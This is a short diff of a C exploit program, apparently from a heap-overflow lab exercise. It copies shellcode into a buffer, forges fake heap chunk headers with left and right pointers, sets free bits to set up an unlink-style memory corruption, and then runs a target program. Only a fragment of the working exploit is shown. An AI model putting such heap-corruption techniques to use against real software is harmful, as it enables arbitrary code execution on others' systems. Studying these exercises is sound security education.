@@ -56,9 +56,13 @@ int main(void)
   strncpy(buf+972, shellcode, 45);
   //strncpy(buf+244, "\x12\x34\x56\x78", 4);
 
-  void* vp = (void*)buf + (0x8059948 - 0x8059878);
+  void *vp = (void*)buf + (0x8059948 - 0x8059878);
   CHUNK *p = TOCHUNK(vp);
 
+  CHUNK *l = p->s.l = vp-sizeof(CHUNK);
+  CHUNK *r = p->s.r = vp+sizeof(CHUNK); 
+
+  SET_FREEBIT(l);
   SET_FREEBIT(p);
  
   args[0] = TARGET; 
